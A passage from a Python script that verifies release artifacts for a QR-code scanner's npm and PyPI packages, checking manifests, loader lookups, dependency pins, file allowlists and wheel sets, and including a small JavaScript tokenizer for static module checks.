    art.check("repository is this repo (trusted publishing matches on it)",
              "github.com/qrcode-ai-com/qrcode-barcode-scanner" in json.dumps(pkg.get("repository", "")),
              json.dumps(pkg.get("repository")))
    check_license(art, files.get("LICENSE"), "package/LICENSE")
    check_stray(art, files)
    scripts = pkg.get("scripts") or {}
    # A platform package is the main name plus the suffix of a committed napi
    # target: never -wasm, -mcp or any other word.
    platforms = {f"{NODE_NAME}-{suffix}": suffix for suffix in napi_suffixes()}
    art.check(f"package name is no retired name ({RETIRED_SCOPE}…, {RETIRED_STEM}…)", not retired_npm_name(name),
              name)
    if name == NODE_NAME:
        check_exact_set(art, files, NODE_FILES, "main-package allowlist")
        native = files.get("native.js", b"").decode(errors="replace")
        literal = LOADER_LITERAL.search(native)
        art.check("loader enforces the package's own version (no literal)",
                  not literal and LOADER_RUNTIME_READ in native,
                  f"literal {literal.group(0)!r}" if literal else f"reads {LOADER_RUNTIME_READ}")
        problems = loader_problems(native, platforms.values())
        art.check(f"loader looks up each committed target's addon ({NODE_BINARY}.<suffix>.node), platform package "
                  "and its package.json exactly once, and besides napi's helpers only those names (no retired name, "
                  "no WebAssembly or WASI)", not problems, "; ".join(problems[:12]))
        binary_name = (pkg.get("napi") or {}).get("binaryName")
        art.check(f"napi.binaryName is {NODE_BINARY}", binary_name == NODE_BINARY, f"{binary_name}")
        check_equal_file(art, "report-types.d.ts", files.get("report-types.d.ts"), CANON_TYPES)
        check_equal_file(art, "README.md", files.get("README.md"), NODE_DIR / "README.md")
        check_readme(art, files.get("README.md"), ("npm", NODE_NAME))
        # Every file a consumer's `require` runs or reads is the committed one,
        # byte for byte: in publish-native the tree is the tag's fresh checkout.
        for source in ("index.js", "native.js", "index.d.ts", "native.d.ts"):
            check_equal_file(art, source, files.get(source), NODE_DIR / source)
        # The manifest is the committed one: `napi pre-publish` adds only the pins.
        committed = json.loads((NODE_DIR / "package.json").read_text())
        differ = sorted(key for key in {*pkg, *committed} - {"optionalDependencies"}
                        if pkg.get(key) != committed.get(key))
        art.check("package.json is the committed manifest (napi pre-publish adds only optionalDependencies)",
                  not differ, f"differs in: {', '.join(differ)}" if differ else "")
        on_install = sorted(set(scripts) & INSTALL_SCRIPTS)
        art.check("no install-time lifecycle script (preinstall · install · postinstall · prepare)",
                  not on_install, ", ".join(on_install))
        # `napi pre-publish` pins every napi target at the package version: the
        # loader can only find a binary through those pins. The committed
        # manifest carries none (a dev build); a release set must carry all.
        optional = pkg.get("optionalDependencies")
        if optional is not None or host.args.release_set:
            check_pins(art, optional or {}, pkg)
        return art
    if name == WASM_NAME or name in platforms:
        # Generated manifests (wasm-pack, napi create-npm-dirs) carry no
        # scripts: any is planted, and some would run on a consumer's install.
        art.check("no lifecycle scripts (`scripts` absent)", not scripts,
                  f"scripts: {', '.join(sorted(scripts))}" if scripts else "")
    # The exact WASM name is judged first: it starts like a platform name.
    if name == WASM_NAME:
        check_exact_set(art, files, WASM_FILES, "wasm-pack output + patch allowlist")
        check_wasm_manifest(art, pkg)
        check_equal_file(art, "report-types.d.ts", files.get("report-types.d.ts"), CANON_TYPES)
        check_wasm_build(art, files, pkg.get("version"), name)
        for notice in ("LICENSE-APACHE-2.0", "THIRD-PARTY.md"):
            check_equal_file(art, notice, files.get(notice), ROOT / "crates/qrcode-ai-scanner" / notice)
        for source in ("auto.js", "auto.d.ts", "camera.js", "camera.d.ts", "camera-overlay.js", "camera-overlay.d.ts",
                       "destination.js", "destination.d.ts", "destination-node.js", "destination-node.d.ts"):
            check_equal_file(art, source, files.get(source), WASM_DIR / source)
        check_destination_modules(art, files)
        for source in WASM_EXAMPLE_FILES:
            check_equal_file(art, source, files.get(source), WASM_DIR / source)
        check_example(art, files)
        dts = files.get(f"{WASM_STEM}.d.ts", b"").decode()
        retyped = all(
            re.search(rf"export function {fn}\([^)]*\): ScanReport;", dts) for fn in ("scan_image", "scan_frame")
        ) and re.search(r"export function capabilities\(\): Capabilities;", dts)
        art.check(f"{WASM_STEM}.d.ts re-exports report-types and returns ScanReport / Capabilities",
                  'export * from "./report-types"' in dts and bool(retyped))
        check_equal_file(art, "README.md", files.get("README.md"), WASM_DIR / "README.md")
        check_readme(art, files.get("README.md"), ("npm", WASM_NAME))
        check_readme(art, files.get("examples/README.md"), ("npm", f"{WASM_NAME} examples"), "examples/README.md")
    elif name in platforms:
        binaries = sorted(f for f in files if f.endswith(".node"))
        art.check("exactly one .node binary, and it is `main`",
                  len(binaries) == 1 and binaries[0] == pkg.get("main"), f"{binaries} main={pkg.get('main')}")
        addon = f"{NODE_BINARY}.{platforms[name]}.node"
        art.check(f"the addon is {addon} (napi.binaryName and this package's suffix)", binaries == [addon],
                  ", ".join(binaries))
        expected = frozenset({"package.json", "LICENSE", *binaries, *(["README.md"] if "README.md" in files else [])})
        check_exact_set(art, files, expected, "platform-package set (package.json · README · LICENSE · binary)")
        art.check("os + cpu declared", bool(pkg.get("os")) and bool(pkg.get("cpu")),
                  f"os={pkg.get('os')} cpu={pkg.get('cpu')}")
        check_platform_manifest(art, pkg)
        check_equal_file(art, "README.md", files.get("README.md"), ROOT / "distribution/npm/README.md")
        check_readme(art, files.get("README.md"), ("npm", name))
    else:
        art.check(f"known package name: {NODE_NAME}, {WASM_NAME} or a platform package {NODE_NAME}-<suffix> of a "
                  f"committed napi target ({', '.join(platforms.values())})", False, name)
    return art


# What the napi loader requires besides an addon: fs, its own manifest, and
# child_process (it runs ldd to tell glibc from musl).
LOADER_HELPERS = frozenset({"node:fs", "./package.json", "child_process"})


def loader_problems(native: str, suffixes) -> list:
    """How the main package's loader departs from one lookup per committed target. A smoke run
    loads one branch only, so every branch is read from the text: for each of SUFFIXES exactly one
    require() of its addon file, one of its platform package and one of that package's
    package.json; no other lookup (napi's branches for targets never built stay under the same
    names); no retired name; no WebAssembly or WASI fallback."""
    problems = []
    if RETIRED_SCOPE in native or re.search(r"qrcode[-_]ai[-_]scanner", native):
        problems.append(f"names a retired package or file ({RETIRED_SCOPE} or {RETIRED_STEM})")
    if re.search(r"wasi|wasm", native, re.IGNORECASE):
        problems.append("has a WebAssembly or WASI lookup")
    lookups = [found for found in re.findall(r"require\('([^']+)'\)", native) if found not in LOADER_HELPERS]
    foreign = sorted({found for found in lookups if not found.startswith((f"./{NODE_BINARY}.", f"{NODE_NAME}-"))})
    if foreign:
        problems.append(f"looks up {', '.join(foreign)}")
    for suffix in suffixes:
        for specifier in (f"./{NODE_BINARY}.{suffix}.node", f"{NODE_NAME}-{suffix}",
                          f"{NODE_NAME}-{suffix}/package.json"):
            count = lookups.count(specifier)
            if count != 1:
                problems.append(f"{specifier} looked up {count} times")
    return problems


def check_platform_manifest(art: Artifact, pkg: dict) -> None:
    """A platform package.json holds only the keys `napi create-npm-dirs` writes,
    with the values it derives from the main manifest: anything else (a
    dependencies key, a bin, a publishConfig key beyond registry/access) is
    planted and would reach a consumer's install."""
    suffix = str(pkg.get("name", "")).removeprefix(NODE_NAME + "-")
    main = json.loads((NODE_DIR / "package.json").read_text())
    binary = f"{main.get('napi', {}).get('binaryName')}.{suffix}.node"
    parts = suffix.split("-")
    os_name, cpu = (parts[0] if parts else ""), (parts[1] if len(parts) > 1 else "")
    abi = parts[2] if len(parts) > 2 else ""
    carried = [key for key in NAPI_CARRIED if key in main]
    allowed = {"name", "version", "main", "files", "cpu", "os", *carried}
    if "publishConfig" in main:
        allowed.add("publishConfig")
    if abi in ("gnu", "musl"):
        allowed.add("libc")
    extra = sorted(set(pkg) - allowed)
    art.check("package.json holds only napi create-npm-dirs' keys (no dependencies, bin or key beyond them)",
              not extra, f"unexpected: {', '.join(extra)}" if extra else "")
    want = {"name": f"{NODE_NAME}-{suffix}", "version": main.get("version"), "main": binary, "files": [binary],
            "cpu": [cpu], "os": [os_name], **{key: main[key] for key in carried}}
    if abi == "gnu":
        want["libc"] = ["glibc"]
    elif abi == "musl":
        want["libc"] = ["musl"]
    needed = [key for key in ("name", "version", "main", "files", "cpu", "os") if key not in pkg]
    off = sorted(key for key, value in want.items() if key in pkg and pkg[key] != value)
    art.check("each generated field is napi create-npm-dirs' value from the main manifest", not needed and not off,
              "; ".join(filter(None, [f"missing {', '.join(needed)}" if needed else "",
                                      "; ".join(f"{key}={pkg.get(key)!r} (want {want[key]!r})" for key in off)])))
    pc = pkg.get("publishConfig")
    if isinstance(pc, dict):
        bad = sorted(set(pc) - {"registry", "access"})
        art.check("publishConfig holds only registry/access (napi create-npm-dirs picks those)", not bad,
                  f"unexpected publishConfig keys: {', '.join(bad)}" if bad else "")


def check_wasm_manifest(art: Artifact, pkg: dict) -> None:
    """A wasm package.json holds only the keys wasm-pack + patch-wasm-pkg write."""
    extra = sorted(set(pkg) - WASM_MANIFEST_KEYS)
    art.check("package.json holds only wasm-pack + patch-wasm-pkg keys (no dependencies or publishConfig)",
              not extra, f"unexpected: {', '.join(extra)}" if extra else "")
    exports = pkg.get("exports", {})
    art.check("automatic loader and root entry exports are retained",
              exports.get("./auto") == {"types": "./auto.d.ts", "import": "./auto.js", "default": "./auto.js"}
              and exports.get(".") == {"types": f"./{WASM_STEM}.d.ts", "import": f"./{WASM_STEM}.js",
                                       "default": f"./{WASM_STEM}.js"}
              and exports.get("./*") == "./*")
    # The 0.10 compatible/ subpaths were removed (the loader option variant:
    # 'compatible' selects the one module): no key may name them again.
    compatible = sorted(key for key in exports if "compatible" in key)
    art.check(f"one WASM export ({WASM_MODULE}) and its build record; no compatible/ export",
              exports.get(f"./{WASM_MODULE}") == f"./{WASM_MODULE}"
              and exports.get("./build-info.json") == "./build-info.json" and not compatible,
              ", ".join(compatible) or json.dumps(sorted(exports)))
    # wasm-pack's entry fields name the module's own files, never retired ones.
    entries = {key: pkg.get(key) for key in ("main", "module", "types") if key in pkg}
    wanted = {"main": f"{WASM_STEM}.js", "module": f"{WASM_STEM}.js", "types": f"{WASM_STEM}.d.ts"}
    off = sorted(f"{key}={value!r}" for key, value in entries.items() if value != wanted[key])
    art.check(f"main, module and types (where present) name {WASM_STEM}.js and {WASM_STEM}.d.ts",
              bool(entries) and not off, ", ".join(off) or json.dumps(entries))
    art.check("camera capture, tracking and visual overlay exports are retained",
              all(exports.get(f"./{name}") == {"types": f"./{name}.d.ts", "import": f"./{name}.js", "default": f"./{name}.js"}
                  for name in ("camera", "camera-overlay"))
              and exports.get("./report-types") == {"types": "./report-types.d.ts"})
    problems = destination_export_problems(exports)
    art.check("browser-safe destination core and Node-only resolver exports", not problems, "; ".join(problems))


# The destination core runs anywhere. The Node resolver is exported under `node` alone (types
# first): with no import, default or browser target, a browser build fails at resolution instead
# of bundling node: modules. The null key keeps "./*" from serving that file without conditions,
# and no other key or pattern may reach it.
DESTINATION_EXPORTS = {
    "./destination": {"types": "./destination.d.ts", "import": "./destination.js", "default": "./destination.js"},
    "./destination-node": {"types": "./destination-node.d.ts", "node": "./destination-node.js"},
}


def destination_export_problems(exports: dict) -> list:
    """How EXPORTS departs from a browser-safe destination core and a Node-only resolver."""
    problems = []
    for key, want in DESTINATION_EXPORTS.items():
        got = exports.get(key)
        # Conditions match in object order: the same targets in another order are another export.
        if not isinstance(got, dict) or list(got.items()) != list(want.items()):
            problems.append(f"{key} is {json.dumps(got)}, not {json.dumps(want)}")
    if "./destination-node.js" not in exports:
        problems.append("no ./destination-node.js key (want null: the file stays unexported)")
    elif exports["./destination-node.js"] is not None:
        problems.append(f"./destination-node.js is {json.dumps(exports['./destination-node.js'])}, not null")
    others = sorted(key for key, value in exports.items()
                    if key != "./destination-node" and "./destination-node.js" in json.dumps(value))
    patterns = sorted(key for key in exports if "*" in key and key != "./*")
    if others:
        problems.append(f"also exported as {', '.join(others)}")
    if patterns:  # only "./*" is shadowed by the null key; another pattern could map onto the file
        problems.append(f"subpath patterns besides ./*: {', '.join(patterns)}")
    return problems


def check_pins(art: Artifact, optional: dict, pkg: dict) -> None:
    version = pkg.get("version")
    targets = pkg.get("napi", {}).get("targets") or []
    want = {f"{NODE_NAME}-{napi_suffix(triple)}": version for triple in targets}
    problems = [f"{dep} is a retired name" for dep in sorted(optional) if retired_npm_name(dep)]
    problems += [f"missing {dep}" for dep in sorted(set(want) - set(optional))]
    problems += [f"unexpected {dep}" for dep in sorted(set(optional) - set(want))]
    problems += [f"{dep} pinned at {optional[dep]}, not {version}" for dep in sorted(set(want) & set(optional))
                 if optional[dep] != version]
    art.check(f"optionalDependencies pin every napi target ({len(want)}) at {version}",
              bool(want) and not problems, "; ".join(problems) or f"{len(want)} pins")


def wheel_tags(filename: str) -> set:
    """The python-abi-platform tags a wheel file name stands for (PEP 427: dotted = a set)."""
    parts = filename.removesuffix(".whl").split("-")
    if len(parts) not in (5, 6):
        return set()
    pythons, abis, platforms = (part.split(".") for part in parts[-3:])
    return {f"{p}-{a}-{q}" for p in pythons for a in abis for q in platforms}


def check_pypi_release_set(host: Host) -> None:
    """--release-set over Python archives: exactly what python › release uploads."""
    names = sorted(a.package.get("filename", "") for a in host.artifacts if a.kind in ("wheel", "sdist"))
    art = host.add(Artifact("PyPI release set", "pypi"))
    art.listing = names
    problems = []
    problems += [f"{name} is a retired name" for name in names if name.startswith(RETIRED_MODULE)]
    sdists = [n for n in names if n.endswith(".tar.gz")]
    if sdists != [f"{PY_MODULE}-{host.version}.tar.gz"]:
        problems.append(f"want one sdist {PY_MODULE}-{host.version}.tar.gz, got {sdists or 'none'}")
    rows: dict = {label: [] for label, _pattern in WHEEL_PLATFORMS}
    for name in (n for n in names if n.endswith(".whl")):
        if not name.startswith(f"{PY_MODULE}-{host.version}-"):
            problems.append(f"{name} is not {PY_MODULE} version {host.version}")
        platforms = {tag.rsplit("-", 1)[1] for tag in wheel_tags(name)}
        found = [label for label, pattern in WHEEL_PLATFORMS
                 if platforms and all(pattern.fullmatch(p) for p in platforms)]
        if found:
            rows[found[0]].append(name)
        else:
            problems.append(f"{name} is no row of python.yml's wheels matrix")
    problems += [f"no {label} wheel" for label, wheels in rows.items() if not wheels]
    problems += [f"{len(wheels)} {label} wheels: {', '.join(wheels)}" for label, wheels in rows.items()
                 if len(wheels) > 1]
    art.check(f"one wheel per row of python.yml's matrix ({len(WHEEL_PLATFORMS)}) and one sdist, "
              f"all at {host.version}, nothing else", not problems, "; ".join(problems))


def check_release_set(host: Host) -> None:
    """--release-set: the set about to publish is complete and holds nothing else."""
    kinds = {a.kind for a in host.artifacts}
    if kinds & CLI_KINDS:  # one release set per run: the CLI set refuses npm or Python files beside it
        check_cli_release_set(host)
        return
    if "npm" in kinds:
        check_npm_release_set(host)
    if kinds & {"wheel", "sdist"}:
        check_pypi_release_set(host)
    if not kinds & {"npm", "wheel", "sdist"}:
        host.add(Artifact("release set", "archive")).check("npm, Python or CLI release files given", False,
                                                           ", ".join(kinds))


def check_npm_release_set(host: Host) -> None:
    """--release-set over npm archives: one main package, exactly one platform package per pin."""
    npm = [a for a in host.artifacts if a.kind == "npm" and a.package.get("name")]
    mains = [a for a in npm if a.package["name"] == NODE_NAME]
    art = host.add(Artifact("npm release set", "npm"))
    if not art.check("exactly one main package", len(mains) == 1, f"{len(mains)} found"):
        return
    pins = mains[0].package.get("optionalDependencies") or {}
    # publish-native uploads every tarball of the set: anything that is not
    # the main package or one of its pins (the wasm package, a second copy
    # of a platform package) has no place in it.
    names = [a.package["name"] for a in npm if a.package["name"] != NODE_NAME]
    platforms = {a.package["name"]: a.package.get("version") for a in npm if a.package["name"] != NODE_NAME}
    problems = [f"{name} is a retired name" for name in sorted(set(names)) if retired_npm_name(name)]
    problems += [f"{name} appears {names.count(name)} times" for name in sorted(set(names)) if names.count(name) > 1]
    problems += [f"no {dep}@{version} platform package" for dep, version in sorted(pins.items())
                 if platforms.get(dep) != version]
    problems += [f"{dep} is neither the main package nor pinned by it" for dep in sorted(set(platforms) - set(pins))]
    art.listing = sorted(f"{dep}@{version}" for dep, version in platforms.items())
    art.check(f"one platform package per pin ({len(pins)}), at the pinned version, and nothing else",
              bool(pins) and not problems, "; ".join(problems))


NAPI_SUFFIX = {
    ("darwin", "arm64"): "darwin-arm64", ("darwin", "x86_64"): "darwin-x64",
    ("linux", "x86_64"): "linux-x64-gnu", ("linux", "aarch64"): "linux-arm64-gnu",
    ("win32", "AMD64"): "win32-x64-msvc",
}

# napi-rs's platformArchABI, ported as-is from @napi-rs/cli 3.7.3
# (cli/src/utils/target.ts parseTriple): the suffix of each platform package
# that `napi pre-publish` pins in the main package's optionalDependencies.
_NAPI_CPU = {"x86_64": "x64", "aarch64": "arm64", "i686": "ia32", "armv7": "arm",
             "loongarch64": "loong64", "riscv64gc": "riscv64", "powerpc64le": "ppc64"}
_NAPI_SYS = {"linux": "linux", "freebsd": "freebsd", "darwin": "darwin", "windows": "win32",
             "ohos": "openharmony"}


def napi_suffix(triple: str) -> str:
    if triple in ("wasm32-wasi", "wasm32-wasi-preview1-threads") or triple.startswith("wasm32-wasip"):
        return "wasm32-wasi"
    parts = (f"{triple[:-4]}-eabi" if triple.endswith("eabi") else triple).split("-")
    if len(parts) == 2:
        cpu, system, abi = parts[0], parts[1], None
    else:
        cpu, system, abi = parts[0], parts[2], parts[3] if len(parts) > 3 else None
    if abi in ("android", "ohos"):
        system, abi = abi, None
    platform_name, arch = _NAPI_SYS.get(system, system), _NAPI_CPU.get(cpu, cpu)
    return f"{platform_name}-{arch}-{abi}" if abi else f"{platform_name}-{arch}"


def napi_suffixes() -> list:
    """The platform-package suffix of every target in the node package.json."""
    targets = json.loads((NODE_DIR / "package.json").read_text())["napi"]["targets"]
    return [napi_suffix(triple) for triple in targets]


def emulated_platform_dir(host: Host) -> pathlib.Path:
    """A platform package in the shape `napi create-npm-dirs` writes, + LICENSE.

    Proves npm's always-included LICENSE survives the platform package's
    `files` allowlist; CI (npm-publish.yml pack-native) inspects the real dirs.
    """
    import platform
    suffix = NAPI_SUFFIX.get((sys.platform, platform.machine()), "linux-x64-gnu")
    node_pkg = json.loads((NODE_DIR / "package.json").read_text())
    binary = f"{node_pkg['napi']['binaryName']}.{suffix}.node"
    os_name, cpu = suffix.split("-")[:2]
    pdir = host.scratch / "emulated-platform"
    pdir.mkdir(parents=True, exist_ok=True)
    (pdir / "package.json").write_text(json.dumps({
        "name": f"{NODE_NAME}-{suffix}",
        "version": node_pkg["version"],
        "cpu": [cpu],
        "main": binary,
        "files": [binary],
        "description": node_pkg.get("description"),
        "license": node_pkg.get("license"),
        "engines": node_pkg.get("engines"),
        "repository": node_pkg.get("repository"),
        "os": [os_name],
    }, indent=2))
    shutil.copyfile(ROOT / "distribution/npm/README.md", pdir / "README.md")
    shutil.copyfile(NODE_DIR / "LICENSE", pdir / "LICENSE")
    built = NODE_DIR / binary
    if built.is_file():
        shutil.copyfile(built, pdir / binary)
    else:
        (pdir / binary).write_bytes(b"placeholder: no local napi build\n")
    return pdir


def cmd_node(host: Host) -> None:
    tarball, err = npm_pack(host, "node-main", NODE_DIR)
    if tarball is None:
        host.add(Artifact(f"npm {NODE_NAME}", "npm")).unavailable(err)
        return
    inspect_npm(host, tarball, notes=["packed from the source tree (--ignore-scripts: the committed files)"])
    platform_root = pathlib.Path(host.args.platform_dirs).resolve() if host.args.platform_dirs else None
    if platform_root:
        dirs = sorted(d for d in platform_root.iterdir() if (d / "package.json").is_file())
        if not dirs:
            host.add(Artifact("npm platform packages", "npm")).check(
                "platform package dirs", False, f"none under {rel(platform_root)}")
        for pdir in dirs:
            tarball, err = npm_pack(host, f"node-{pdir.name}", pdir)
            if tarball is None:
                host.add(Artifact(f"npm platform {pdir.name}", "npm")).check("npm pack", False, err)
            else:
                inspect_npm(host, tarball, notes=["napi create-npm-dirs + napi artifacts output"])
        if host.args.release_set:
            check_npm_release_set(host)
        return
    if host.args.release_set:
        host.add(Artifact("npm release set", "npm")).check("--platform-dirs given", False,
                                                           "a release set needs its platform packages")
        return
    tarball, err = npm_pack(host, "node-platform-emulated", emulated_platform_dir(host))
    if tarball is None:
        host.add(Artifact("npm platform package (emulated)", "npm")).unavailable(err)
        return
    inspect_npm(host, tarball, notes=[
        "EMULATED: the napi create-npm-dirs package shape with LICENSE copied in, packed by the real npm; "
        "the real per-target dirs are inspected in npm-publish.yml (pack-native)",
    ])


def wasm_opt_version():
    if not which("wasm-opt"):
        return None
    proc = subprocess.run(["wasm-opt", "--version"], capture_output=True, text=True)
    found = re.search(r"version (\d+)", proc.stdout)
    return int(found.group(1)) if found else None


def cmd_wasm(host: Host) -> None:
    pkg = WASM_DIR / "pkg"
    note = "pkg/ as found (--no-build)"
    if not host.args.no_build:
        missing = [t for t in ("wasm-pack", "node") if not which(t)]
        opt = wasm_opt_version()
        if missing or opt is None or opt < 130:
            reason = ", ".join([*(f"{t} not on PATH" for t in missing),
                                *([] if opt and opt >= 130 else [f"wasm-opt {opt or 'absent'} (needs binaryen >= 130)"])])
            host.add(Artifact(f"npm {WASM_NAME}", "npm")).unavailable(reason)
            return
        proc = host.run("build-wasm", ["bash", str(ROOT / "scripts" / "build-wasm.sh")])
        if proc.returncode != 0:
            host.add(Artifact(f"npm {WASM_NAME}", "npm")).check(
                "scripts/build-wasm.sh (build · wasm-opt · patch · smoke)", False, f"exit {proc.returncode}: {tail(proc)}")
            return
        note = "pkg/ built by scripts/build-wasm.sh (wasm-pack · wasm-opt · patch · test.mjs)"
    if not (pkg / "package.json").is_file():
        host.add(Artifact(f"npm {WASM_NAME}", "npm")).unavailable("no crates/qrcode-ai-scanner-wasm/pkg/ to pack")
        return
    tarball, err = npm_pack(host, "wasm", pkg)
    if tarball is None:
        host.add(Artifact(f"npm {WASM_NAME}", "npm")).unavailable(err)
        return
    inspect_npm(host, tarball, notes=[note])


# ---------------------------------------------------------------- wasm · destination modules

# The destination modules are read statically as they ship (each is also its crate file
# verbatim). The core imports nothing and keeps to the oldest browser the package is tested in
# (the Chromium build scripts/install-no-simd-browser.mjs installs): ES2020 syntax, the
# consumer build target of scripts/packed-wasm-browser.mjs, and none of the newer APIs below.
# These lists refuse known forms; they cannot prove the floor, which only a run of the module
# in that browser does. The Node resolver loads only these modules, never reads the proxy or
# TLS environment switches, and states certificate checks and strict HTTP parsing as literals.
NODE_RESOLVER_IMPORTS = frozenset({"node:http", "node:https", "node:dns", "./destination.js"})
# Static members, read as `Owner.name`, `Owner?.name` or `Owner['name']`.
FLOOR_STATICS = (("AbortSignal", "any"), ("AbortSignal", "timeout"), ("URL", "canParse"), ("URL", "parse"),
                 ("Promise", "withResolvers"), ("Promise", "try"), ("Object", "groupBy"), ("Map", "groupBy"),
                 ("Array", "fromAsync"), ("RegExp", "escape"))
FLOOR_GLOBALS = frozenset(owner for owner, _name in FLOOR_STATICS)
# Names no older API uses: refused wherever they appear, a quoted member (`xs['toSorted']`) included.
FLOOR_NAMES = ("toSorted", "toReversed", "toSpliced", "structuredClone", "isWellFormed", "toWellFormed",
               "symmetricDifference", "isSubsetOf", "isSupersetOf", "isDisjointFrom", "Iterator")
# Common words, refused only as a called member: `xs.with(…)`, `a?.union(…)`, `it['take'](…)`.
# Iterator helpers that share an Array method's name (map, filter, …) cannot be told apart here.
FLOOR_METHODS = ("with", "union", "intersection", "difference", "take", "drop", "toArray")
# A modifier group, `(?i:…)` or `(?-s:…)`; `(?:…)` has no flag. A named group, not a lookbehind.
JS_REGEX_MODIFIERS = re.compile(r"\(\?([ims]*)(?:-([ims]*))?:")
JS_REGEX_GROUP_NAME = re.compile(r"\(\?<([^=!>][^>]*)>")
# Longest first; `?.` before a digit is `?` (a conditional), handled where it is read.
JS_PUNCTUATORS = sorted({
    ">>>=", "...", "===", "!==", "**=", "<<=", ">>=", ">>>", "&&=", "||=", "??=", "=>", "==", "!=", "<=", ">=",
    "&&", "||", "??", "?.", "++", "--", "+=", "-=", "*=", "/=", "%=", "&=", "|=", "^=", "**", "<<", ">>",
    *"{}()[];,<>+-*/%&|^!~?:=."}, key=len, reverse=True)
# After these words an expression starts, so a `/` opens a regular expression, not a division.
JS_REGEX_AFTER = frozenset({"return", "typeof", "instanceof", "in", "of", "new", "delete", "void", "throw", "case",
                            "do", "else", "yield", "await"})
JS_PUNCT = re.compile("|".join(map(re.escape, JS_PUNCTUATORS)))
# Whitespace (with U+FEFF) and comments; `//` and `/*` never open a regular expression.
JS_SKIP = re.compile(r"(?:[\s" + chr(0xFEFF) + r"]|//[^\n]*|/\*[\s\S]*?\*/)+")
JS_NAME = re.compile(r"(?:[^\W\d]|\$)[\w$]*")
JS_NUMBER = re.compile(r"(?:0[xXoObB][0-9a-fA-F_]+|(?:\d[\d_]*\.?[\d_]*|\.\d[\d_]*)(?:[eE][+-]?[\d_]+)?)n?")
JS_STRING = re.compile(r"'(?:[^'\\\n]|\\[\s\S])*'" + r'|"(?:[^"\\\n]|\\[\s\S])*"')
JS_TEMPLATE = re.compile(r"(?:[^`\\$]|\\[\s\S]|\$(?!\{))*(?:`|\$\{)")  # a template's text through ` or ${
JS_REGEXP = re.compile(r"/(?:[^/\\\[\n]|\\.|\[(?:[^\]\\\n]|\\.)*\])+/[\w$]*")


def js_tokens(source: str) -> tuple:
    """SOURCE as (kind, value, line) tokens without comments. A string's value is its text
    between the quotes; a template literal yields one `template` token per text part, ending
    with its delimiter (` or ${), with the tokens of each substitution between them. Enough of
    the lexical grammar to read a module; what it cannot read raises ValueError, never a guess."""
    tokens, braces, n = [], [], len(source)  # (kind, value, offset); braces: True for a `${`
    i = (source.find("\n") if "\n" in source else n) if source.startswith("#!") else 0

    def fail(what: str, at: int):
        line = source.count("\n", 0, at) + 1
        raise ValueError(f"line {line}: {what}")

    def regex_allowed() -> bool:
        if not tokens:
            return True
        kind, value, _offset = tokens[-1]
        if kind == "name":
            return value in JS_REGEX_AFTER
        if kind == "punct":
            return value not in (")", "]", "++", "--")
        return kind == "template" and value.endswith("${")

    while True:
        skipped = JS_SKIP.match(source, i)
        i = skipped.end() if skipped else i
        if i >= n:
            break
        ch = source[i]
        if source.startswith("/*", i):
            fail("unterminated comment", i)
        if ch == "`" or (ch == "}" and braces and braces[-1]):
            if ch == "}":
                braces.pop()
            match = JS_TEMPLATE.match(source, i + 1)
            if not match:
                fail("unterminated template literal", i)
            tokens.append(("template", match.group(), i))
            if match.group().endswith("${"):
                braces.append(True)
        elif ch in "'\"":
            match = JS_STRING.match(source, i)
            if not match:
                fail("unterminated string", i)
            tokens.append(("str", match.group()[1:-1], i))
        elif ch == "/" and regex_allowed():
            match = JS_REGEXP.match(source, i)
            if not match:
                fail("unterminated regular expression", i)
            tokens.append(("regex", match.group(), i))
        elif ch.isdigit() or (ch == "." and source[i + 1:i + 2].isdigit()):
            match = JS_NUMBER.match(source, i)
            tokens.append(("num", match.group(), i))
        elif ch == "#" and (match := JS_NAME.match(source, i + 1)):
            tokens.append(("private", "#" + match.group(), i))
        elif match := JS_NAME.match(source, i):
            tokens.append(("name", match.group(), i))
        else:
            match = JS_PUNCT.match(source, i)
            if not match:
                fail(f"unexpected character {ch!r}", i)
            punct = "?" if match.group() == "?." and source[i + 2:i + 3].isdigit() else match.group()
            if punct == "{":
                braces.append(False)
            elif punct == "}" and braces:
                braces.pop()
            tokens.append(("punct", punct, i))
            i += len(punct)
            continue
        i = match.end()
    if True in braces:
        fail("unterminated template substitution", n)
    newlines = [match.start() for match in re.finditer("\n", source)]
    return tuple((kind, value, bisect.bisect_right(newlines, at) + 1) for kind, value, at in tokens)


@functools.lru_cache(maxsize=64)
def read_module(judge, source: str) -> tuple:
    """JUDGE's problems with SOURCE, or why SOURCE cannot be read. Cached: the self-test ships
    the same module bytes in most of its archives."""
    try:
        return tuple(judge(js_tokens(source)))
    except ValueError as error:
        return (f"not readable as JavaScript: {error}",)


def _at(tokens: list, k: int):
    return tokens[k] if 0 <= k < len(tokens) else None


def _is(token, *punctuators: str) -> bool:
    return token is not None and token[0] == "punct" and token[1] in punctuators


def _close(tokens: list, k: int) -> int:
    """The index just past the bracket that closes the one at K."""
    if not _is(_at(tokens, k), "(", "[", "{"):
        line = tokens[min(k, len(tokens) - 1)][2] if tokens else 1
        raise ValueError(f"line {line}: expected a bracket")
    depth = 0
    for j in range(k, len(tokens)):
        depth += _is(tokens[j], "(", "[", "{") - _is(tokens[j], ")", "]", "}")
        if depth == 0:
            return j + 1
    raise ValueError(f"line {tokens[k][2]}: unclosed {tokens[k][1]}")


def _member(tokens: list, k: int):
    """The property read right after tokens[K] (`.p`, `?.p`, `["p"]`, `?.["p"]`, `[`p`]`), or None."""
    j = k + 1 + (_is(_at(tokens, k + 1), "?.") and _is(_at(tokens, k + 2), "["))
    after = _at(tokens, j + 1)
    if _is(_at(tokens, j), ".", "?.") and after and after[0] == "name":
        return after[1]
    if _is(_at(tokens, j), "[") and _is(_at(tokens, j + 2), "]") and _member_bracket(tokens, j):
        return _quoted(after)
    return None


def _quoted(token):
    """The text of a string token, or of a template token that opens and closes with no
    substitution (a whole template right after `[`), else None."""
    if token is not None and token[0] == "str":
        return token[1]
    if token is not None and token[0] == "template" and token[1].endswith("`"):
        return token[1][:-1]
    return None


def _ends_expression(token) -> bool:
    """TOKEN can end an expression, so a `[` right after it reads a member."""
    if token is None:
        return False
    kind, value, _line = token
    if kind == "name":
        return value not in JS_REGEX_AFTER  # after `return`, `typeof`, … an expression starts
    if kind == "punct":
        return value in (")", "]")
    return kind in ("str", "num", "regex") or (kind == "template" and value.endswith("`"))


def _member_bracket(tokens: list, j: int) -> bool:
    """tokens[J], a `[`, reads a member of the expression before it rather than opening an array
    literal, a destructuring pattern or a computed key."""
    return _is(_at(tokens, j - 1), "?.") or _ends_expression(_at(tokens, j - 1))


def js_imports(tokens: list) -> list:
    """(form, module, line) for each module a source loads: an import declaration or `export …
    from` names its module (None when unreadable); import(), require() and getBuiltinModule()
    calls are listed with None."""
